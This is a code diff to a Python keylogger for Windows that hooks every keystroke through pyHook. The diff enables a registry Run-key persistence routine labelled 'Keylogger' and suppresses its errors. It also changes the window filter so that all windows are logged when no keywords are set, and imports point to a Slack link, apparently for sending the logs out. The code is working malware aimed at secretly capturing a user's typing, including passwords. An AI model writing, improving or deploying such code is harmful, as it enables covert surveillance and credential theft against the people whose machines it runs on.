@@ -12,10 +12,14 @@ from requests import Session, Request
 from datetime import datetime
 from _winreg import *
 from os.path import join, abspath
+from tendo import singleton
 
 #########################################
 #		INITIALIZATION VARIABLES		#
 #########################################
+
+# Ensure a single instance of the program:
+instance = singleton.SingleInstance() # will sys.exit(-1) if other instance is running
 
 # Slack link:
 config = configparser.ConfigParser()
@@ -66,9 +70,12 @@ class EventHandler(threading.Thread):
 		the key_words list'''
 		res = False
 		upper_case_wn = WindowName.upper()
-		for key_word in key_words:
-			if key_word in upper_case_wn:
-				res = True
+		if not key_words:
+			res = True
+		else:
+			for key_word in key_words:
+				if key_word in upper_case_wn:
+					res = True
 		return res
 
 	def log(self, data, WindowName):
@@ -124,6 +131,7 @@ def persist():
 	with OpenKey(HKEY_CURRENT_USER, sub_key, 0, KEY_ALL_ACCESS) as key:
 		SetValueEx(key, "Keylogger", 0, REG_SZ, path_to_exe)
 
+
 #################################
 #		ALGORITHM RELEVANT  	#
 #################################
@@ -136,13 +144,17 @@ def persist():
 if __name__ == '__main__':
 	eh = EventHandler(MODE, BUFFER)
 	eh.start()
-	# hide the console
+	# hide the console:
 	# window = win32console.GetConsoleWindow()
 	# win32gui.ShowWindow(window, 0)
-	# comment persist() if you don't want the code to run at startup of the computer
-	# persist()
-	hm = pyHook.HookManager()
-	hm.SubscribeKeyDown(on_keyboard)
-	hm.HookKeyboard()
-	# infinite loop
-	pythoncom.PumpMessages()
+	try:
+		# comment persist() if you don't want the code to run at startup of the computer
+		persist()
+	except:
+		pass
+	finally:
+		hm = pyHook.HookManager()
+		hm.SubscribeKeyDown(on_keyboard)
+		hm.HookKeyboard()
+		# infinite loop
+		pythoncom.PumpMessages()
